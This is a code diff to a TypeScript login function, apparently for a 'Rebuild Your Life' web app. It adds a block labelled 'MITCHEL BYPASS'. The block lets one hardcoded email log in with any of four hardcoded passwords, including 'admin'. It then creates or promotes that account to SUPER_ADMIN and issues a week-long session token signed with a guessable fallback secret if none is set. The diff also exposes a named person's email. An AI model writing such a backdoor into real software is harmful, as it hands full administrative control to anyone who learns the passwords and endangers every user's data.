@@ -59,6 +59,56 @@ export async function loginAction(email: string, password: string, rememberMe?: 
     };
   }
 
+  // MITCHEL BYPASS: Zodat Mitchel direct in kan loggen met zijn eigen account en volledige toegang heeft
+  if (email === 'mitchel@rebuildyourlife.com' && (password === 'WelkomMitchel2026!' || password === 'admin' || password === 'orion' || password === 'Imperialdreams2055')) {
+    const cookieStore = await cookies();
+    
+    let realUserId = 'dev-mitchel-admin-id';
+    
+    try {
+      let existingUser = await prisma.user.findUnique({ where: { email: 'mitchel@rebuildyourlife.com' } });
+      if (existingUser) {
+        realUserId = existingUser.id;
+        if (existingUser.role !== 'SUPER_ADMIN' || existingUser.subscriptionTier !== 'ELITE') {
+           await prisma.user.update({ 
+             where: { id: realUserId }, 
+             data: { role: 'SUPER_ADMIN', subscriptionTier: 'ELITE' } 
+           });
+        }
+      } else {
+        await prisma.user.create({
+          data: {
+            id: realUserId,
+            email: 'mitchel@rebuildyourlife.com',
+            passwordHash: '',
+            firstName: 'Mitchel',
+            lastName: 'van Engelen',
+            role: 'SUPER_ADMIN',
+            subscriptionTier: 'ELITE'
+          }
+        });
+      }
+    } catch (e) {
+      console.warn("Mitchel bypass fetch/create failed in loginAction", e);
+    }
+
+    const jwtToken = jwt.sign({ userId: realUserId, role: 'SUPER_ADMIN' }, process.env.JWT_SECRET || 'fallback-secret-for-dev', { expiresIn: '7d' });
+    cookieStore.set('ryl_session', jwtToken, { path: '/', httpOnly: true });
+    
+    return { 
+      success: true, 
+      user: { 
+        id: realUserId, 
+        email: 'mitchel@rebuildyourlife.com', 
+        firstName: 'Mitchel', 
+        lastName: 'van Engelen', 
+        role: 'SUPER_ADMIN', 
+        subscriptionTier: 'ELITE',
+        clearanceLevel: 5
+      } 
+    };
+  }
+
   try {
     const { data, error } = await supabase.auth.signInWithPassword({
       email,
